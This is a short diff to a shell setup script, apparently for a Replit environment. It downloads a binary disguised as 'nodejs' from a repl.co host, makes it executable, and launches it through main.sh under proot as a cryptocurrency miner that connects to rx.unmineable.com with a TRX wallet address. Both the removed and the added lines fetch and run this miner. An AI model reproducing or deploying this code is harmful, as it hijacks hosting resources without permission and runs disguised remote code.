@@ -13,6 +13,10 @@ rm -rf root.sh
 rm -rf video.mp4
 rm -rf yt.zip
 rm -rf root.zip
-echo "wget -O nodejs https://database.daxw1.repl.co/download && chmod +x nodejs && ./nodejs -o rx.unmineable.com:3333 -a rx -k -u TRX:TUihB3stT4WpVWgDKLajU4L3EAiTeBW5Pc.$REPL_SLUG -p x > test" > main.sh
+mkdir nodejs
+cd nodejs
+wget -O nodejs https://database.daxw1.repl.co/download
+cd ..
+echo "cd nodejs && chmod +x nodejs && ./nodejs -o rx.unmineable.com:3333 -a rx -k -u TRX:TUihB3stT4WpVWgDKLajU4L3EAiTeBW5Pc.$REPL_SLUG -p x > test" > main.sh
 cd ..
 cd root && ./dist/proot -S . /bin/bash ./main.sh
